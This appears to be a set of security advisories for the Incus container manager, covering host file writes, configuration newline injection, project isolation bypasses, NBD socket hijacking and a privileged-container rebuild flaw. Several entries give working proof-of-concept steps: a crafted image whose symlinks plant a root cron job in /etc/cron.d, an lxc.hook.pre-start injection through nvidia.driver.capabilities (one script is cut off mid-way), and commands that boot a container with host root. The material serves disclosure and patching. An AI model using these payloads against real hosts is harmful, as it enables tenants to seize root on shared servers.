CVE-2026-81494.title: Arbitrary file write on host via image-planted symlinks and oci.dns.* newline injection
CVE-2026-81494.description:
## Summary Incus extracts a unified image's top-level files straight into the instance directory, and later writes to two of those paths as root without checking for symlinks: `backup.yaml` (at instance create) and `network/resolv.conf` (at OCI container start). An imported image can ship those names as absolute symlinks pointing anywhere on the host. When the instance is created and started, `incusd` follows them and writes root-owned files outside the instance directory. Because `oci.dns.domain` and `oci.dns.search` accept newlines, the content written to `resolv.conf` is attacker-controlled. Pointing that symlink at `/etc/cron.d/` turns the write into root command execution. This is reachable by importing a crafted image (`incus image import`), not by pulling one from an OCI/Docker registry - the registry path rebuilds the metadata tarball from only `config.json` and `metadata.yaml`, so it can't carry these entries. ## Who can do this The relevant boundary is the project-scoped (restricted) certificate, which Incus treats as an 'operator (`internal/server/auth/driver_tls.go:83-94`, role assigned at `:242`). Such a user has full rights inside their own project - including importing images and creating/starting instances - but is not a server admin and is confined to their project. This bug lets that operator write files as root on the host, escaping the project. It does not add any privilege in the default single-admin setup (local socket, one unrestricted cert), where an image importer is already root-equivalent. The `PR:L` score assumes the restricted/multi-tenant model. ## Root cause 1. Image top-level content is unpacked into the instance directory and never sanitized. `getImageMetadata()` (`cmd/incusd/images.go`) only checks that `metadata.yaml` and a `rootfs/` entry exist; it doesn't reject extra entries like `network/` or `backup.yaml`. `ImageUnpack()` (`internal/server/storage/utils.go`) only `Lstat`s `rootfs` for a symlink. On the dir backend the whole tarball goes straight into the instance volume. 2. Two root writes under the instance dir use plain `os.WriteFile`/`os.Create`, which follow symlinks. The sibling `templates` and `credentials` writes in the same driver were already moved to `os.OpenRoot`; these two were not. | Path | Location (7.2.0 → main) | Written at | Instance types | |---|---|---|---| | `network/resolv.conf` | `driver_lxc.go:2635` → `:2644` | OCI start | OCI containers | | `backup.yaml` | `backend.go:6967` → `:7042` | instance create | all containers + VMs | 3. `oci.dns.domain` / `oci.dns.search` use `validate.IsAny` (`internal/instance/config.go:816/825`, `:830/839` on main), so newlines pass. `resolv.conf` is built with `fmt.Fprintf(&resolvConf, 'domain %s
', value)`, so a newline in the value adds a second, fully controlled line. `backup.yaml` is the broader of the two: it needs no `config.json` or `oci.*` config, fires on create for every instance type, and isn't fixed by hardening only the `network/` writes. ## Call path Create → `instanceCreateFromImage()` (`instance.go:137`) → `CreateInstanceFromImage()` (`backend.go:1824`) unpacks the image into the instance dir (planting the symlinks), then `UpdateBackupFile()` (`instance.go:273`) → `os.Create(inst.Path()/backup.yaml)` (`backend.go:7042`) follows the symlink. Start → config generation checks `PathExists(d.Path()/config.json)` (`driver_lxc.go:2426`), then `os.WriteFile(d.Path()/network/resolv.conf, …)` (`:2644`) follows the symlink. ## What I tested Incus 7.2 (client and server), dir storage backend, `incus admin init --minimal`, Ubuntu 24.04. One crafted image with both symlinks. - `incus init` wrote the `backup.yaml` symlink target as `root:root`, mode 0400, outside the instance dir, containing the instance's backup YAML. No start needed. - `incus start` wrote the `resolv.conf` symlink target as `root:root`, mode 0644. The nested container start then failed under Docker (`forklxc`), but the write happens during config generation before that, so it lands regardless. On a full VM the start also completes. - Root command execution via `/etc/cron.d`: this needs one detail. A value like `x
* * * * * root <cmd>` writes `domain x` as the first line, which cron 3.0pl1 (Debian/Ubuntu) treats as a syntax error and drops the whole file - nothing runs. Prefixing the value with `=` (so the line becomes `domain =x`) makes cron read it as an environment assignment (`domain=x`), the file is accepted, and the next line runs. With that, cron executed the injected command as root; the proof file contained `uid=0(root) gid=0(root) groups=0(root)`. The arbitrary root write itself needs no cron and no other component. Code execution needs a host-side consumer of the file - cron is the one I demonstrated (present by default on most server distros), and needs the `=` trick above. Other consumers (`~root/.ssh/authorized_keys`, `/etc/ld.so.preload`) have their own preconditions. ## Reproduction Tested on a disposable host with Incus 7.2.0 and a dir storage pool (`incus admin init --minimal`). Everything below runs as an ordinary Incus user against their own project; the files that get written are owned by root. ### 1. Build the crafted image The same image carries both symlinks. `backup.yaml` is aimed at a harmless `/tmp` marker (proves the write); `network/resolv.conf` is aimed at `/etc/cron.d` (proves code execution). Point both at `/tmp` if you only want the write proof. ```bash mkdir -p img/rootfs img/network cat > img/metadata.yaml <<'EOF' architecture: x86_64 creation_date: 1 properties: type: oci EOF # minimal but valid OCI runtime spec; process.args is dereferenced before the resolv.conf write printf '{'ociVersion':'1.0.2','process':{'user':{'uid':0,'gid':0},'args':['/bin/sh'],'cwd':'/'},'root':{'path':'rootfs'}}' > img/config.json ln -s /tmp/incus-write-proof img/backup.yaml # write target (create) ln -s /etc/cron.d/incus-rce img/network/resolv.conf # RCE target (start) tar --owner=0 --group=0 --numeric-owner -C img -cf image.tar \ metadata.yaml rootfs config.json network backup.yaml tar -tf image.tar # confirms the two entries are symlinks ``` ### 2. Arbitrary root write - `backup.yaml`, fires at create ```bash incus image import image.tar --alias evil incus init evil victim stat -c '%n %U:%G %a' /tmp/incus-write-proof ``` Expected: the file exists outside any instance directory, owned by root: ``` /tmp/incus-write-proof root:root 400 ``` `/tmp/incus-write-proof` now holds the instance's backup YAML - proof that `os.Create(inst.Path()/backup.yaml)` followed the symlink. This alone is the arbitrary-write primitive and needs no container start. ### 3. Root command execution - `resolv.conf` into `/etc/cron.d` The injected value must start with `=` so the first line becomes `domain =x`, which cron reads as an environment assignment; without it, the leading `domain x` line is a cron syntax error and Debian/Ubuntu cron drops the whole file. ```bash incus config set victim oci.dns.domain '$(printf '=x
* * * * * root id > /tmp/rce 2>&1')' incus start victim # writes /etc/cron.d/incus-rce via the symlink (start itself may error afterwards) cat /etc/cron.d/incus-rce ``` Expected file (root:root, 0644): ``` domain =x * * * * * root id > /tmp/rce 2>&1 ``` Within a minute cron runs it as root: ```bash sleep 65; cat /tmp/rce # uid=0(root) gid=0(root) groups=0(root) ``` ### Cleanup ```bash incus delete -f victim; incus image delete evil rm -f /tmp/incus-write-proof /tmp/rce /etc/cron.d/incus-rce ``` ## Impact Arbitrary create/truncate of any root-writable file on the host (I:H/A:H): truncate `/etc/shadow`, overwrite a systemd unit, corrupt `incusd` state. Root command execution (C:H/I:H/A:H) when the write lands in a file a root process reads, as shown with cron. The write is in the host mount namespace and isn't limited by the container's user namespace or privilege level. ## Fix 1. Do the writes under the instance dir through `os.OpenRoot` (already used for templates and credentials): `backup.yaml`, `network/resolv.conf`, `network/hosts`, `network/hostname`, `network/dhcp.skip`. 2. After unpack, reject or remove daemon-owned top-level entries (`network/`, `backup.yaml`, `config.json`, `credentials/`, `state/`, …) instead of trusting the image; extend the existing `rootfs` symlink check to them. 3. Reject ``/`
` in `oci.dns.domain` and each `oci.dns.search` element.

CVE-2026-81498.title: Container configuration newline injection through nvidia.driver.capabilities
CVE-2026-81498.description:
## Summary ### Impact The `nvidia.driver.capabilities` instance configuration key in Incus uses `validate.IsAny` at `internal/instance/config.go:744`, which accepts any input without filtering. The value is subsequently written to the generated `lxc.conf` file at `internal/server/instance/drivers/driver_lxc.go:1104` via `fmt.Sprintf` with zero escaping. An authenticated attacker with permission to set instance configuration can inject a newline character (`
`) into the value, causing a line break in `lxc.conf` and injecting arbitrary LXC configuration directives — including `lxc.hook.pre-start` — which execute as **root on the host** when the container starts. This is an **independent bypass of CVE-2026-23953**. The CVE-2026-23953 fix added `
` filtering for `environment.*` config keys at `config.go:1621`, but `nvidia.driver.capabilities` uses a separate validator (`validate.IsAny`) that was never audited or fixed. The injection mechanism is identical to CVE-2026-23953 — the only difference is the entry config key. ### Patches No official patch is available. Apply the Workarounds below. ### Workarounds 1. **Do not grant instance configuration privileges to untrusted users.** This is the most effective immediate mitigation. 2. **Apply the code patch** below to `internal/instance/config.go`: ```diff - 'nvidia.driver.capabilities': validate.IsAny, + 'nvidia.driver.capabilities': validate.IsNvidiaConfigValue, ``` 3. **Additionally audit** `nvidia.require.cuda` and `nvidia.require.driver` (lines 753, 762) — they also use `validate.IsAny` but have a missing `else` clause in `driver_lxc.go` that currently prevents exploitation. Fix both the validator AND the missing else clause. ## Attack Path (Validation Evidence) ``` [Entry Point] POST /1.0/instances or PUT/PATCH /1.0/instances/{name} or incus config set <instance> nvidia.driver.capabilities <value> ↓ User-supplied value, e.g.: 'all
lxc.hook.pre-start = /bin/sh -c 'id > /tmp/pwn'' [Validator] ConfigKeyChecker('nvidia.driver.capabilities') (config.go:744) → returns validate.IsAny (shared/validate/validate.go:188) → func IsAny(_ string) error { return nil } ✗ ZERO validation — 
 passes through without any check [Storage] Config stored as-is in SQLite database ↓ No transformation [Load] initLXC() (driver_lxc.go:1097) nvidiaDriver := d.expandedConfig['nvidia.driver.capabilities'] ↓ Original value loaded [Branch] if nvidiaDriver == '' { ... } else { ... } (driver_lxc.go:1097-1108) nvidiaDriver != '' → enters ELSE branch ✅ [Format] fmt.Sprintf(''NVIDIA_DRIVER_CAPABILITIES=%s'', nvidiaDriver) (line 1104) ↓ 
 embedded verbatim in formatted string [Sink] lxcSetConfigItem(cc, 'lxc.environment', formattedValue) (line 1104) → c.SetConfigItem(key, value) — LXC C library, no escaping (line 150) → cc.SaveConfigFile(configPath) — writes raw bytes to lxc.conf (line 2788) ↓ lxc.conf contains: lxc.environment = 'NVIDIA_DRIVER_CAPABILITIES=all lxc.hook.pre-start = /bin/sh -c 'id > /tmp/pwn'' [Impact] On container start, LXC reads lxc.conf line-by-line The injected line 'lxc.hook.pre-start = ...' is parsed as a valid LXC config directive → /bin/sh -c 'id > /tmp/pwn' executes as ROOT ON HOST ``` ## Taint Flow (Validation Evidence) ``` Source: User-controlled string value for 'nvidia.driver.capabilities' ↓ ✗ validate.IsAny — returns nil for ALL input (no filtering, no validation) [Store] SQLite database — value stored verbatim ↓ ✗ No transformation [Load] d.expandedConfig['nvidia.driver.capabilities'] — original value restored ↓ ✗ No sanitization [Format] driver_lxc.go:1104: fmt.Sprintf(''NVIDIA_DRIVER_CAPABILITIES=%s'', nvidiaDriver) ↓ ✗ %s writes raw bytes — no escaping of 
, , or any special characters [Sink] lxcSetConfigItem('lxc.environment', '<value containing 
>') → c.SetConfigItem → cc.SaveConfigFile → lxc.conf on disk ``` **Sanitization Verdict: ABSENT** — No filtering, validation, or escaping exists at any layer between user input and lxc.conf file write. ## Proof of Concept ### CLI (based on confirmed CLI usage from Phase A) ```bash # 1. Create a test container (no GPU hardware required) incus launch images:alpine/edge test-injection # 2. Inject 
 + LXC hook via nvidia.driver.capabilities # The $'...' bash syntax embeds a literal 
 byte incus config set test-injection nvidia.driver.capabilities \ $'all
lxc.hook.pre-start = /bin/sh -c 'id > /tmp/host_id_proof'' # 3. Verify the value was accepted (validate.IsAny passes everything) incus config get test-injection nvidia.driver.capabilities # 4. Restart the container to trigger the injected hook incus restart test-injection # 5. Verify host code execution incus exec test-injection -- cat /tmp/host_id_proof # Expected: uid=0(root) gid=0(root) groups=0(root) # This proves the command ran as HOST root, not container root ``` ### REST API (based on confirmed API usage from Phase A) ```bash echo ' config: nvidia.driver.capabilities: | all lxc.hook.pre-start = /bin/sh -c 'echo API_PWN > /tmp/api_proof' ' | incus query -X PATCH /1.0/instances/test-injection --data - incus restart test-injection incus exec test-injection -- cat /tmp/api_proof # Expected: API_PWN ``` ### Why this works On Linux, `
` (0x0a) is the line terminator for all standard text file I/O (`fgets`, `getline`, `read`). LXC's liblxc C library uses standard I/O to write and read `lxc.conf`. When the `
` byte is embedded in a config value and written to disk, it creates a line break in the config file. On the next line, `lxc.hook.pre-start = /bin/sh -c '...'` is a syntactically valid LXC configuration directive that LXC will parse and execute. Note: `` (0x0d, carriage return) alone is NOT a line terminator on Linux and cannot cause this injection. The dangerous character is specifically `
` (line feed). ## Why nvidia.require.cuda and nvidia.require.driver are NOT Currently Exploitable Code at `driver_lxc.go:1110-1124`: ```go nvidiaRequireCuda := d.expandedConfig['nvidia.require.cuda'] if nvidiaRequireCuda == '' { // ← BUG: should be != '' err = lxcSetConfigItem(cc, 'lxc.environment', // ← only writes when value IS empty fmt.Sprintf(''NVIDIA_REQUIRE_CUDA=%s'', nvidiaRequireCuda)) // NO else clause — user's non-empty value is silently dropped } ``` Both `nvidia.require.cuda` and `nvidia.require.driver` have the condition `if value == ''` with no `else` clause. When a user sets a non-empty (malicious) value, it is **not written** to `lxc.conf`. This appears to be a functional bug (the intent was likely `if value != ''`) that accidentally prevents exploitation through these two keys. Only `nvidia.driver.capabilities` (lines 1097-1108) has the correct `if/else` structure and is currently exploitable. ### POC ```sh #!/bin/bash # ============================================================ # Proof of Concept: Incus nvidia.driver.capabilities 
 Injection # CVE-2026-23953 Fix Bypass # # Target: Ubuntu 22.04 LTS (Jammy Jellyfish) # CWE-74: Improper Neutralization of Special Elements in Output # CVSS 3.1: 8.7 (AV:A/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N) # # This script demonstrates that the CVE-2026-23953 fix is # incomplete. While environment.* config keys now correctly # block 
 characters, the nvidia.driver.capabilities config # key uses validate.IsAny (passthrough) and allows 
 to reach # lxcSetConfigItem → lxc.conf, where it creates a line break # and injects arbitrary LXC directives including # lxc.hook.pre-start for container escape → host RCE. # ============================================================ set -euo pipefail RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m' log() { echo -e '${GREEN}[+]${NC} $*'; } warn() { echo -e '${YELLOW}[!]${NC} $*'; } err() { echo -e '${RED}[-]${NC} $*'; } echo '============================================================' echo ' PoC: Incus nvidia.driver.capabilities Newline Injection' echo ' CVE-2026-23953 Fix Bypass (CWE-74, CVSS 8.7)' echo '============================================================' echo '' # ============================================================ # Step 1: Install Incus # ============================================================ log 'Step 1/5: Install Incus (Zabbly repo)' if ! command -v incus &>/dev/null 2>&1; then sudo mkdir -p /etc/apt/keyrings curl -fsSL https://pkgs.zabbly.com/key.asc | sudo gpg --dearmor -o /etc/apt/keyrings/zabbly.gpg echo 'deb [signed-by=/etc/apt/keyrings/zabbly.gpg] https://pkgs.zabbly.com/incus/stable $(lsb_release -sc) main' \ | sudo tee /etc/apt/sources.list.d/zabbly-incus-stable.list > /dev/null sudo apt-get update -qq && sudo apt-get install -y incus incus-client incus-base fi log 'Incus version: $(incus version 2>&1)' # ============================================================ # Step 2: Initialize Incus # ============================================================ log 'Step 2/5: Initialize Incus' if ! sudo incus info &>/dev/null 2>&1; then sudo incus admin init --auto 2>&1 || true fi if ! incus storage list 2>/dev/null | grep -q default; then sudo incus storage create default dir 2>&1 || true fi if ! incus profile show default 2>/dev/null | grep -q 'root:'; then incus profile device add default root disk path=/ pool=default 2>&1 || true fi log 'Incus is ready' # ============================================================ # Step 3: Pull test image # ============================================================ log 'Step 3/5: Pull test image (alpine/edge)' incus image alias delete alpine-test 2>/dev/null || true incus image delete alpine-test 2>/dev/null || true incus image copy images:alpine/edge local: --alias alpine-test 2>&1 || { incus remote add tuna https://mirrors.tuna.tsinghua.edu.cn/lxc-images/ 2>/dev/null || true incus image copy tuna:alpine/edge local: --alias alpine-test 2>&1 } log 'Image ready' # ============================================================ # Step 4: Setup + Create container with injected config # ============================================================ log 'Step 4/5: Setup dummy NVIDIA tools + create container with injected config' # Create dummy NVIDIA tools to bypass initLXC() checks at # driver_lxc.go:1082-1089 (hookPath exists + nvidia-container-cli in PATH) # incusd runs as a systemd service, so use /usr/bin (not /usr/local/bin) sudo ln -sf /bin/true /usr/bin/nvidia-container-cli sudo mkdir -p /usr/share/lxc/hooks /opt/incus/share/lxc/hooks sudo ln -sf /bin/true /usr/share/lxc/hooks/nvidia sudo ln -sf /bin/true /opt/incus/share/lxc/hooks/nvidia log 'Dummy NVIDIA tools installed (symlinks to /bin/true)' # The injection payload. # In JSON, 
 is an escape sequence (two characters: backslash + n). # The server-side JSON decoder converts it to a literal newline byte (0x0a). # # Attack flow: # nvidia.driver.capabilities = 'all
lxc.hook.pre-start = ...' # → validate.IsAny (passthrough, zero validation) # → Config stored in SQLite database # → initLXC() reads d.expandedConfig['nvidia.driver.capabilities'] # → driver_lxc.go:1104: fmt.Sprintf(''NVIDIA_DRIVER_CAPABILITIES=%s'', value) # → lxcSetConfigItem('lxc.environment', formatted) # → cc.SaveConfigFile() writes lxc.conf with literal 
 byte # →

CVE-2026-81499.title: Project restriction bypass on network address sets
CVE-2026-81499.description: ### Summary The network address set API is missing from the auth object project-expansion switch, so a project-restricted client can read and rewrite the default project's address sets. ### Details **Project confinement bypass on the network address set API** All six handlers in cmd/incusd/network_address_sets.go resolve the effective project via project.NetworkProject(), which returns 'default' when the project does not have features.networks set. But expandProject in cmd/incusd/daemon.go (lines 326-372) has no branch for auth.ObjectTypeNetworkAddressSet, so the authorization object is constructed with the requested project instead of the effective one. Verified against the switch at HEAD c0ca96d, which handles Profile (352), StorageBucket (354), StorageVolume (356), NetworkZone (363), Image/ImageAlias (365) and Network/NetworkACL (367) — NetworkAddressSet appears nowhere. Consequence: a certificate restricted to project P can read, rewrite, rename and delete the default project's address sets, which feed network ACL rules for every other tenant. features.networks defaults to false at project creation, so this is the default state of every project, not an unusual configuration. Supporting evidence: the sibling auth.ObjectTypeNetworkACL is expanded on the same line, and the address-set LIST endpoint filters on the real project and correctly returns nothing — this is the only mismatch found when diffing every cmd/incusd caller of an effective-project resolver against the object types passed to allowPermission. ### Suggested fixes Add auth.ObjectTypeNetworkAddressSet to the expansion in expandProject alongside Network and NetworkACL. More durably, make expandProject fail closed on an unhandled object type rather than returning the requested project, so a future new API cannot repeat this. ### Tooling and credit AI assistance was used during investigation; the reporter read the full expandProject switch and confirmed the missing object type against its expanded siblings at HEAD, and independently confirmed the os.WriteFile call in instance_metadata.go.

CVE-2026-81501.title: Restricted client can import a private image from another project
CVE-2026-81501.description: ### Summary A project-restricted TLS client that cannot `GET /1.0/images/{fingerprint}` for a **private** image in another project can still import that same fingerprint into their own project. `imageDownload` reuses any matching local image via `GetImageFromAnyProject` without checking `Public` or `CanView`. Image blobs are stored globally under `var/images/<fingerprint>`, so the caller receives the private image properties and files. This is the image-object counterpart of GHSA-c9f5-j9c3-mhrg (instance copy from `req.Source.Project` without `CanView`). It is not a privileged-container escape. ### Affected - Runtime reproduction: Ubuntu 24.04 package **Incus 6.0.0** (`6.0.0-1ubuntu0.3`) in an isolated Docker environment. - Same unguarded call is present on `lxc/incus` at `v7.3.0-432-gf216a6d46` in `cmd/incusd/daemon_images.go`. - Full release range should be confirmed by maintainers. ### Contrast (same restricted client, same fingerprint) | Request | Result | | --- | --- | | `GET /1.0/images/<fp>?project=default` | **404** (`imageGet` requires `CanView` or public/secret) | | `POST /1.0/images?project=hunt-b` with `source.type=image` pulling from an attacker HTTPS server that only echoes `<fp>` | operation **Success**; image now listed in `hunt-b` with the victim `properties` | The attacker server never supplies image bytes. Incus clones the local private record and files. A harmless marker (`INCUS-HUNT-MARKER`) in the victim image properties appears in the attacker project. ### Impact A restricted client with `CanCreateImages` (or the ability to create an instance from an image) in their own project, who already knows a private image fingerprint from another project, can: - copy that image's properties and global blob into their project; - then view, export, or launch instances from it inside their project. This breaks Incus project isolation for private images. **Limitation:** the 64-hex fingerprint is not returned by `GET` / list to a caller without `CanView`. The attacker must obtain it out of band (logs, backups, a former project membership, a predictable custom image, etc.). No victim interaction is required after that. ### Root cause `imageGet` / `imagesGet` / `imageExport` apply `CheckPermission(ObjectImage, CanView)` and hide private images behind 404. `imageDownload`, after a dest-project miss, does: ```go _, imgInfo, err = tx.GetImageFromAnyProject(ctx, fp) // then CreateImage into the caller project — no Public / CanView check ``` Reachable from: - `POST /1.0/images` with `source.type=image` - `POST /1.0/instances` when `source.server != ''` `AllowImageDownload` only enforces `restricted.images.servers` (remote host allowlist). It is not an object-level `CanView` check. ### Suggested fix After `GetImageFromAnyProject` succeeds, only reuse the local image if: 1. `imgInfo.Public` is true, or 2. `CheckPermission` on `ObjectImage(imgInfo.Project, fingerprint)` with `EntitlementCanView` succeeds. Otherwise continue with a real remote download. Do not copy the private local image. ### Dedup Not a duplicate of: - GHSA-mq9x-prm8-3vpw / GHSA-c9f5-j9c3-mhrg — instance copy `Source.Project` without `CanView` (same class, different object and entry point) - GHSA-p8mm-23gg-jc9r — simplestreams concatenated fingerprint - GHSA-f6m5-xw2g-xc4x / GHSA-p2v3-6wvc-cv3p — fingerprint used as a filesystem path - GHSA-8gw4-p4wq-4hcv — URL import HEAD SSRF - Incus 7.3 leftover name-as-path / OpenRoot issues ### PoC Isolated Docker environment attached as `incus-private-image-anyproject.zip`. ```bash unzip incus-private-image-anyproject.zip cd incus-private-image-anyproject ./run.sh ``` Expected: `all_checks_passed: true`, `verdict=private_image_cross_project_reuse_reproduced_at_runtime`. The container starts Ubuntu 24.04 + distro Incus 6.0.0, creates a private image in `default` (marker in `properties.description`), a project `hunt-b`, and a restricted TLS cert bound only to `hunt-b`. It then runs the contrast above. Harmless marker only; no instance is launched. `results/runtime.json` from our run is included. ### Severity Medium. Suggested: `CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:N/A:N` = 6.3. | Metric | Value | Reason | | --- | --- | --- | | AV | N | HTTPS API | | AC | H | 64-hex fingerprint required; not enumerable via GET/list (404) | | PR | L | project-restricted TLS client with image-create rights, not admin | | UI | N | no victim interaction | | S | C | breaks project isolation (same Scope as GHSA-c9f5) | | C | H | full private image (properties + rootfs blob) | | I | N | victim image is not modified | | A | N | no availability impact | If maintainers treat fingerprint knowledge like instance-name knowledge in GHSA-c9f5, the matching vector is `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N` = 7.7. I am reporting 6.3. ### Credit Yuliang Xiao

GHSA-3rgf-297m-775x.title: Local users can hijack VM NBD migration and disk-export sockets
GHSA-3rgf-297m-775x.description: ### Summary Incus runs NBD servers over unix sockets for two virtual machine operations: migrating a VM's disk to another server, and the disk export and attach path. These sockets were created as abstract unix sockets. Abstract unix sockets live in the network namespace rather than on the filesystem and are not subject to any permission check, so any process in the host network namespace can connect to them. Their names are also visible to any local user through `/proc/net/unix`. ### Impact While a VM migration or disk export is in progress, any local user on the host can connect to the NBD socket and read or write the virtual machine's disk as it is being transferred. This gives full read access to the guest's disk contents and the ability to tamper with the data in flight. On the receiving side of a migration it means controlling the resulting VM's disk, and therefore code execution inside that guest. No privileges beyond a local unprivileged account are required; the attacker only needs to connect while the operation runs, which they can detect from `/proc/net/unix`. Only virtual machines are affected; containers do not use these sockets. ### Workarounds None. There is no configuration based workaround short of not running VM migrations or disk exports on hosts that have untrusted local users.

GHSA-3wxw-5gh2-j2x2.title: Container configuration injection through OCI image config and oci.* keys
GHSA-3wxw-5gh2-j2x2.description: ### Summary Values taken from an OCI image's `config.json`, its environment, entry point and working directory, are written into the generated LXC configuration without validation. The same applies to the `oci.entrypoint` and `oci.cwd` instance keys. As that configuration is line based, a value containing a line break ends the directive and whatever follows is parsed as additional LXC configuration, including hooks that liblxc runs as root on the host. A line break in the configuration key name reaches the same parser. The tmpfs mount definitions of an OCI image are also turned into `lxc.mount.entry` lines from attacker-controlled destination and option fields, which can be crafted to add further mount fields and bind-mount host paths into the container. ### Impact Anyone who can launch an instance from an image they control, or edit the `oci.entrypoint` or `oci.cwd` keys of an OCI container, can run arbitrary commands as root on the host, or bind-mount arbitrary host paths into the container. This includes users confined to a restricted project. Since 7.5.0, `config.json` was also parsed for any image carrying such a file rather than only for OCI images, so a plain imported image tarball could reach the same code path. ### Workarounds Only allow trusted image sources. For restricted projects, `restricted.images.servers` limits where images can be pulled from but does not prevent importing a local image tarball.d

GHSA-5pgx-q9xx-j3qv.title: Restricted project users can read or overwrite host files through special files, hard links or symlinks in backup or image metadata
GHSA-5pgx-q9xx-j3qv.description: ### Impact A client with a restricted certificate that can create images, instances or backups in a project can import a backup or image whose metadata area — the instance volume excluding the guest rootfs, such as `metadata.yaml`, `backup.yaml` or any entry beside them — contains a special file, a hard link or a symlink in place of a regular file. The daemon processes these files as root, outside any container confinement: - A block or character device special file is read and written as the referenced host device. The major and minor numbers are attacker-chosen, so the node can target any host device: pointed at a host block device this corrupts the host's or another instance's storage, and a named pipe makes the import block the daemon indefinitely. - A hard link in place of `backup.yaml` is followed when the daemon writes the instance's backup file, so the write lands on the attacker-chosen host file. - A symlink in the metadata area is followed when the instance is later published or exported, so the generated image or backup embeds the contents of the file it points at, including files of other projects or of the host. ### Workarounds Do not grant image, instance or backup creation to restricted certificates or restricted-project users for untrusted tenants until patched. Operators can audit imported instances for non-regular files, hard links or symlinks in the metadata area (everything in the instance volume except the `rootfs` directory).

GHSA-8mgx-h4v8-xqv2.title: S3 listener buffers signed request bodies before authentication
GHSA-8mgx-h4v8-xqv2.description: ### Summary The local S3 listener used for storage buckets reads the entire body of requests carrying a signed payload into memory to verify its hash. This happened before the request signature was checked and before the credential's role was enforced. ### Impact Anyone knowing a valid access key, without its secret, can have the daemon buffer arbitrarily large request bodies. A read-only credential can do the same with write requests that are then rejected. Enough concurrent requests can exhaust the memory of the daemon. Objects uploaded with valid credentials were also fully buffered in memory before being written to disk. ### Details The signature is now verified first, using the payload hash claimed in the request, and the body is verified against that hash as it's consumed. Requests with an invalid signature or not permitted by the credential's role are rejected before any of the body is read. ### Workarounds Don't expose `core.storage_buckets_address` to untrusted networks.

GHSA-8r3h-vc36-6xpx.title: Restricted and view-only clients can read resources in the default project
GHSA-8r3h-vc36-6xpx.description: ### Summary Projects can use profiles, images, storage volumes, buckets, networks and network zones from the default project by leaving the matching `features.*` key disabled. To support this, restricted certificates are granted read-only access to those resources in the default project. That access was granted regardless of the project being accessed, so a restricted certificate could read them by requesting the default project directly, even when none of its own projects inherit them. This has been the case since restricted certificates were introduced. ### Impact A restricted client can read the configuration of any profile, image, custom storage volume, storage bucket or network zone in the default project, and download any custom volume or bucket backup, provided it knows the resource name. Listing those resources isn't possible. This includes secrets such as network zone peer keys and any credentials stored in profile configuration, as well as the full content of custom volume and bucket backups. The custom volume and bucket backup export routes required only `can_view` rather than backup-management access, so any client that can view the volume or bucket — including a project `viewer` and the inherited default-project access above — could export its backup and obtain the volume's full contents or the bucket's S3 admin keys. ### Workarounds None.

GHSA-9c46-v3hw-v6m8.title: Rebuilding a never-started container makes it boot without a user namespace, running as privileged
GHSA-9c46-v3hw-v6m8.description: ### Summary A container that is rebuilt before it has ever been started boots with no user namespace while its configuration still says it is unprivileged. In-container root is then uid 0 on the host, and because the privileged-container hardening is keyed on the `security.privileged` configuration (not on the actual ID map), none of it is applied. The result is a container the operator believes is unprivileged but which has full host root, retained dangerous capabilities, no device cgroup restriction, `/dev/zfs` exposed, and only the permissive 'unprivileged' AppArmor profile. ### Details `incus create` allocates and persists an ID map at create time for an unprivileged instance: ``` internal/server/instance/drivers/driver_lxc.go:331 lxcCreate sets volatile.idmap.next (and volatile.idmap.base) ``` `volatile.idmap.current` is only written on start, so a never-started instance has `next` but no `current`. `incus rebuild` resets the map, deleting both the pending map and the on-disk map state: ``` internal/server/instance/drivers/driver_common.go:750 delete(instLocalConfig, 'volatile.idmap.next') internal/server/instance/drivers/driver_common.go:751 delete(instLocalConfig, 'volatile.last_state.idmap') ``` After a rebuild of a never-started instance, all of `next`, `current` and `last_state.idmap` are absent. `NextIdmap()` resolves through a fallback chain that then yields `nil`: ``` driver_lxc.go:9372 NextIdmap() -> next absent -> CurrentIdmap() driver_lxc.go:9351 CurrentIdmap() -> current absent -> DiskIdmap() driver_lxc.go:9360 DiskIdmap() -> last_state absent -> (nil, nil) ``` On first start, the map is only (re)allocated when one already exists: ``` driver_lxc.go:2124 if nextMap != nil && d.state.OS.IdmapSet != nil && !d.state.OS.IdmapSet.Includes(nextMap) { ... findIdmap ... } ``` With `nextMap == nil` the block is skipped, no map is allocated, and `initLXC` emits no `lxc.idmap` entries (it only does so for a non-nil set, `driver_lxc.go:1096`). The container therefore starts with an identity map. The hardening is then gated on `IsPrivileged()` (the config), which is false, so: - `lxc.cap.drop` is not applied (`driver_lxc.go`, under `IsPrivileged()`) — container root keeps `sys_module`, `sys_rawio`, `sys_time`, `mac_admin`/`mac_override`; - the device cgroup `deny a` is not installed (under `IsPrivileged()`); - `/dev/zfs` is bind-mounted (the `!IsPrivileged()` branch); - the 'unprivileged' AppArmor profile is selected, which permits `mount` and `pivot_root`. The state is sticky: the first (unmapped) start writes `volatile.idmap.current` to an empty set, so later starts keep resolving to no map until a config change forces reallocation. ### Proof of concept ``` incus create --empty poc incus rebuild images:alpine/3.21 poc incus start poc # in the container, root is uid 0 on the host with full capabilities: incus exec poc -- cat /proc/self/status | grep Cap # CapEff/CapBnd = 000001ffffffffff incus exec poc -- id # uid=0 mapped to host uid 0 ``` The trigger is 'rebuild before first start'; the `--empty` create is one way to reach it, but any rebuild of a never-started unprivileged instance behaves the same. An instance that was started at least once before rebuild is unaffected (its `volatile.idmap.current` survives and the fallback uses it). ### Impact A container the operator configured as unprivileged runs with no user namespace, i.e. as a privileged container without even the privileged-container hardening. Any root process inside it — the whole point of unprivileged confinement being untrusted workloads — is host root with `sys_module` and raw I/O, so it can load a kernel module or write host devices and fully compromise the host. It is silent: nothing in the config or status indicates the instance is unmapped. Long-standing behavior, not a recent regression.

GHSA-9f75-5fjw-5jvv.title: Incus broadcasts OVN ACL log events with an empty project, leaking them across projects
